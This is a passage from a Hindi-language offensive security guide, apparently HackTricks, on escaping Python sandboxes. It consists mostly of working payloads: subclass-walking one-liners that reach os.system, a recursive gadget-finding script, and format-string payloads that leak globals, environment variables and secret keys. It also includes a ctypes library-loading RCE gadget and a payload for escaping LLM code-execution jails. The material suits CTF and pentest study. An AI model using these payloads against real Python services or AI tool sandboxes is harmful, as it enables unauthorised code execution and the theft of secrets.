[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
इसके अलावा, हम यह भी खोज सकते हैं कि कौन से modules malicious libraries लोड कर रहे हैं:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
इसके अलावा, यदि आपको लगता है कि **अन्य libraries** **commands execute करने के लिए functions invoke** कर सकती हैं, तो हम संभावित libraries के अंदर **functions names** के आधार पर भी **filter** कर सकते हैं:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Builtins, Globals... की Recursive Search

> [!WARNING]
> यह वाकई **शानदार** है। यदि आप **globals, builtins, open या किसी अन्य object जैसे object की तलाश कर रहे हैं**, तो उस object को **recursively खोजने के लिए इस script का उपयोग करें, ताकि वे स्थान मिल सकें जहाँ आप उस object को ढूँढ सकते हैं।**
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
आप इस script के output को इस page पर check कर सकते हैं:


{{#ref}}
https://github.com/carlospolop/hacktricks/blob/master/generic-methodologies-and-resources/python/bypass-python-sandboxes/broken-reference/README.md
{{#endref}}

## Python Format String

यदि आप python को **string भेजते हैं** जिसे **formatted** किया जाने वाला है, तो आप `{}` का उपयोग करके **python internal information तक access** कर सकते हैं। उदाहरण के लिए, आप पिछले examples का उपयोग करके globals या builtins तक access कर सकते हैं।<sup>[[14]](#references)</sup>
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
ध्यान दें कि आप सामान्य तरीके से **attributes access** कर सकते हैं, जैसे **dot** के साथ `people_obj.__init__`, और **dict element** को बिना quotes के **parenthesis** के साथ `__globals__[CONFIG]` एक्सेस कर सकते हैं।

यह भी ध्यान दें कि आप किसी object के elements को enumerate करने के लिए `.__dict__` का उपयोग कर सकते हैं: `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

format strings की कुछ अन्य दिलचस्प विशेषताओं में यह संभावना भी शामिल है कि आप दिए गए object में **functions** **`str`**, **`repr`** और **`ascii`** को क्रमशः **`!s`**, **`!r`**, **`!a`** जोड़कर **execute** कर सकते हैं:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
इसके अलावा, classes में **नए formatters को code** करना संभव है:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**format** **string** के बारे में **More examples** [**https://pyformat.info/**](https://pyformat.info) में मिल सकते हैं।

> [!CAUTION]
> **Python internal objects** से संवेदनशील जानकारी पढ़ने वाले gadgets के लिए निम्नलिखित पेज भी देखें:


{{#ref}}
../python-internal-read-gadgets.md
{{#endref}}

### संवेदनशील जानकारी प्रकटीकरण Payloads
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}

# Example from https://corgi.rip/posts/buckeye-writeups/
secret_variable = "clueless"
x = new_user.User(username='{i.find.__globals__[so].mapperlib.sys.modules[__main__].secret_variable}',password='lol')
str(x) # Out: clueless
```
### LLM Jails bypass

[यहाँ](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-an-llm-rce) से: `().class.base.subclasses()[108].load_module('os').system('dir')`.<sup>[[12]](#references)</sup>

### format से RCE द्वारा libraries लोड करना

[**इस writeup के TypeMonkey chall**](https://corgi.rip/posts/buckeye-writeups/) के अनुसार, python में format string vulnerability का दुरुपयोग करके disk से arbitrary libraries लोड करना संभव है।<sup>[[13]](#references)</sup>

याद रखें, python में जब भी कोई action perform किया जाता है, तो कोई function execute होता है। उदाहरण के लिए `2*3`, **`(2).mul(3)`** execute करेगा, या **`{'a':'b'}.__getitem__('a')`** के रूप में **`{'a':'b'}['a']`** execute होगा।

[**Python execution without calls**](#python-execution-without-calls) section में आपको इसके जैसे और उदाहरण मिलेंगे।

Python format string vuln function को execute करने की अनुमति नहीं देता (यह parenthesis का उपयोग करने की अनुमति नहीं देता), इसलिए `'{0.system("/bin/sh")}'.format(os)` जैसा RCE प्राप्त करना संभव नहीं है।\
हालाँकि, `[]` का उपयोग करना संभव है। इसलिए, यदि किसी common python library में कोई **`__getitem__`** या **`__getattr__`** method arbitrary code execute करता है, तो RCE प्राप्त करने के लिए उनका दुरुपयोग करना संभव है।

Python में इस तरह के gadget की खोज करते हुए, writeup में यह [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code) दी गई है। इसमें उन्हें यह [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463) मिला:
```python
class LibraryLoader(object):
def __init__(self, dlltype):
self._dlltype = dlltype

def __getattr__(self, name):
if name[0] == '_':
raise AttributeError(name)
try:
dll = self._dlltype(name)
except OSError:
raise AttributeError(name)
setattr(self, name, dll)
return dll

def __getitem__(self, name):
return getattr(self, name)

cdll = LibraryLoader(CDLL)
pydll = LibraryLoader(PyDLL)
```
यह gadget **disk से एक library load** करने की अनुमति देता है। इसलिए, attacked server पर सही तरीके से compiled **load की जाने वाली library को किसी तरह write या upload करना** आवश्यक है।
```python
'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
```
यह challenge वास्तव में server में मौजूद एक अन्य vulnerability का दुरुपयोग करता है, जो server की disk पर arbitrary files बनाने की अनुमति देती है।

## Python Objects का विश्लेषण

> [!TIP]
> यदि आप **python bytecode** के बारे में गहराई से **सीखना** चाहते हैं, तो इस विषय पर यह **शानदार** post पढ़ें: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)

कुछ CTFs में आपको एक **custom function जिसका flag** में मौजूद है, का नाम दिया जा सकता है और उसे निकालने के लिए आपको **function** के **internals** देखने होंगे।

यह inspect करने वाला function है:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir
```python
dir() #General dir() to find what we have loaded
['__builtins__', '__doc__', '__name__', '__package__', 'b', 'bytecode', 'code', 'codeobj', 'consts', 'dis', 'filename', 'foo', 'get_flag', 'names', 'read', 'x']
dir(get_flag) #Get info tof the function
['__call__', '__class__', '__closure__', '__code__', '__defaults__', '__delattr__', '__dict__', '__doc__', '__format__', '__get__', '__getattribute__', '__globals__', '__hash__', '__init__', '__module__', '__name__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'func_closure', 'func_code', 'func_defaults', 'func_dict', 'func_doc', 'func_globals', 'func_name']
```
#### globals

`__globals__` और `func_globals`(Same) global environment प्राप्त करते हैं। उदाहरण में आप कुछ imported modules, कुछ global variables और घोषित की गई उनकी content देख सकते हैं:
```python
get_flag.func_globals
get_flag.__globals__
{'b': 3, 'names': ('open', 'read'), '__builtins__': <module '__builtin__' (built-in)>, 'codeobj': <code object <module> at 0x7f58c00b26b0, file "noname", line 1>, 'get_flag': <function get_flag at 0x7f58c00b27d0>, 'filename': './poc.py', '__package__': None, 'read': <function read at 0x7f58c00b23d0>, 'code': <type 'code'>, 'bytecode': 't\x00\x00d\x01\x00d\x02\x00\x83\x02\x00j\x01\x00\x83\x00\x00S', 'consts': (None, './poc.py', 'r'), 'x': <unbound method catch_warnings.__init__>, '__name__': '__main__', 'foo': <function foo at 0x7f58c020eb50>, '__doc__': None, 'dis': <module 'dis' from '/usr/lib/python2.7/dis.pyc'>}

#If you have access to some variable value
CustomClassObject.__class__.__init__.__globals__
```
[**globals प्राप्त करने के और स्थान यहाँ देखें**](#globals-and-locals)

### **function code तक पहुँचना**

**`__code__`** और `func_code`: function का **code object प्राप्त करने** के लिए आप function के इस **attribute** को **access** कर सकते हैं।
```python
# In our current example
get_flag.__code__
<code object get_flag at 0x7f9ca0133270, file "<stdin>", line 1

# Compiling some python code
compile("print(5)", "", "single")
<code object <module> at 0x7f9ca01330c0, file "", line 1>

#Get the attributes of the code object
dir(get_flag.__code__)
['__class__', '__cmp__', '__delattr__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__le__', '__lt__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'co_argcount', 'co_cellvars', 'co_code', 'co_consts', 'co_filename', 'co_firstlineno', 'co_flags', 'co_freevars', 'co_lnotab', 'co_name', 'co_names', 'co_nlocals', 'co_stacksize', 'co_varnames']
```
### कोड की जानकारी प्राप्त करना
```python
# Another example
s = '''
a = 5
b = 'text'
def f(x):
return x
f(5)
'''
c=compile(s, "", "exec")

# __doc__: Get the description of the function, if any
print.__doc__

# co_consts: Constants
get_flag.__code__.co_consts
(None, 1, 'secretcode', 'some', 'array', 'THIS-IS-THE-FALG!', 'Nope')

c.co_consts #Remember that the exec mode in compile() generates a bytecode that finally returns None.
(5, 'text', <code object f at 0x7f9ca0133540, file "", line 4>, 'f', None

# co_names: Names used by the bytecode which can be global variables, functions, and classes or also attributes loaded from objects.
get_flag.__code__.co_names
()

c.co_names
('a', 'b', 'f')


#co_varnames: Local names used by the bytecode (arguments first, then the local variables)
get_flag.__code__.co_varnames
('some_input', 'var1', 'var2', 'var3')

#co_cellvars: Nonlocal variables These are the local variables of a function accessed by its inner functions.
get_flag.__code__.co_cellvars
()

#co_freevars: Free variables are the local variables of an outer function which are accessed by its inner function.
get_flag.__code__.co_freevars
()

#Get bytecode
get_flag.__code__.co_code
'd\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S'
```
### **किसी function का Disassembly**
```python
import dis
dis.dis(get_flag)
2           0 LOAD_CONST               1 (1)
3 STORE_FAST               1 (var1)

3           6 LOAD_CONST               2 ('secretcode')
9 STORE_FAST               2 (var2)

4          12 LOAD_CONST               3 ('some')
15 LOAD_CONST               4 ('array')
18 BUILD_LIST               2
21 STORE_FAST               3 (var3)

5          24 LOAD_FAST                0 (some_input)
27 LOAD_FAST                2 (var2)
30 COMPARE_OP               2 (==)
33 POP_JUMP_IF_FALSE       40

6          36 LOAD_CONST               5 ('THIS-IS-THE-FLAG!')
39 RETURN_VALUE

8     >>   40 LOAD_CONST               6 ('Nope')
43 RETURN_VALUE
44 LOAD_CONST               0 (None)
47 RETURN_VALUE
```
ध्यान दें कि **यदि आप python sandbox में `dis` import नहीं कर सकते हैं**, तो आप function का **bytecode** (`get_flag.func_code.co_code`) प्राप्त करके उसे स्थानीय रूप से **disassemble** कर सकते हैं। लोड किए जा रहे variables की content (`LOAD_CONST`) दिखाई नहीं देगी, लेकिन आप उनका अनुमान (`get_flag.func_code.co_consts`) से लगा सकते हैं, क्योंकि `LOAD_CONST` भी लोड किए जा रहे variable का offset बताता है।
```python
dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
0 LOAD_CONST          1 (1)
3 STORE_FAST          1 (1)
6 LOAD_CONST          2 (2)
9 STORE_FAST          2 (2)
12 LOAD_CONST          3 (3)
15 LOAD_CONST          4 (4)
18 BUILD_LIST          2
21 STORE_FAST          3 (3)
24 LOAD_FAST           0 (0)
27 LOAD_FAST           2 (2)
30 COMPARE_OP          2 (==)
33 POP_JUMP_IF_FALSE    40
36 LOAD_CONST          5 (5)
39 RETURN_VALUE
>>   40 LOAD_CONST          6 (6)
43 RETURN_VALUE
44 LOAD_CONST          0 (0)
47 RETURN_VALUE
```
## Python को Compile करना

अब, मान लेते हैं कि किसी तरह आप **उस function के बारे में information dump कर सकते हैं जिसे आप execute नहीं कर सकते**, लेकिन आपको उसे **execute** करना **ज़रूरी** है।\
जैसा कि निम्नलिखित उदाहरण में है, आप उस function के **code object** तक **access** कर सकते हैं, लेकिन केवल disassemble पढ़ने से आपको **flag calculate करने का तरीका पता नहीं चलता** (_एक अधिक जटिल `calc_flag` function की कल्पना करें_).<sup>[[3]](#references)</sup>
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
def calc_flag(flag_rot2):
return ''.join(chr(ord(c)-2) for c in flag_rot2)
if some_input == var2:
return calc_flag("VjkuKuVjgHnci")
else:
return "Nope"
```
### code object बनाना

सबसे पहले, हमें यह जानना होगा कि **code object को कैसे create और execute किया जाता है**, ताकि हम अपने leaked function को execute करने के लिए एक बना सकें:
```python
code_type = type((lambda: None).__code__)
# Check the following hint if you get an error in calling this
code_obj = code_type(co_argcount, co_kwonlyargcount,
co_nlocals, co_stacksize, co_flags,
co_code, co_consts, co_names,
co_varnames, co_filename, co_name,
co_firstlineno, co_lnotab, freevars=None,
cellvars=None)

# Execution
eval(code_obj) #Execute as a whole script

# If you have the code of a function, execute it
mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
```
> [!TIP]
> Python version के अनुसार `code_type` के **parameters** का **order** अलग हो सकता है। आपके द्वारा चलाए जा रहे Python version में params का order जानने का सबसे अच्छा तरीका यह चलाना है:
>
> ```
> import types
> types.CodeType.__doc__
> 'code(argcount, posonlyargcount, kwonlyargcount, nlocals, stacksize,\n      flags, codestring, constants, names, varnames, filename, name,\n      firstlineno, lnotab[, freevars[, cellvars]])\n\nCreate a code object.  Not for the faint of heart.'
> ```

### एक leaked function को फिर से बनाना

> [!WARNING]
> निम्नलिखित example में, हम function को फिर से बनाने के लिए आवश्यक सभी data सीधे function code object से लेंगे। एक **real example** में, function को execute करने के लिए आवश्यक सभी **values**, **`code_type`** ही वे चीजें हैं जिन्हें **आपको leak करना होगा**।
```python
fc = get_flag.__code__
# In a real situation the values like fc.co_argcount are the ones you need to leak
code_obj = code_type(fc.co_argcount, fc.co_kwonlyargcount, fc.co_nlocals, fc.co_stacksize, fc.co_flags, fc.co_code, fc.co_consts, fc.co_names, fc.co_varnames, fc.co_filename, fc.co_name, fc.co_firstlineno, fc.co_lnotab, cellvars=fc.co_cellvars, freevars=fc.co_freevars)

mydict = {}
mydict['__builtins__'] = __builtins__
function_type(code_obj, mydict, None, None, None)("secretcode")
#ThisIsTheFlag
```
### Bypass Defenses

इस post की शुरुआत में दिए गए पिछले examples में आप देख सकते हैं कि **`compile` function का उपयोग करके किसी भी python code को कैसे execute किया जा सकता है**। यह interesting है क्योंकि आप loops और बाकी सभी चीज़ों वाले **पूरे scripts को एक ही **one liner** में execute कर सकते हैं** (और हम `exec` का उपयोग करके भी ऐसा कर सकते हैं)।\
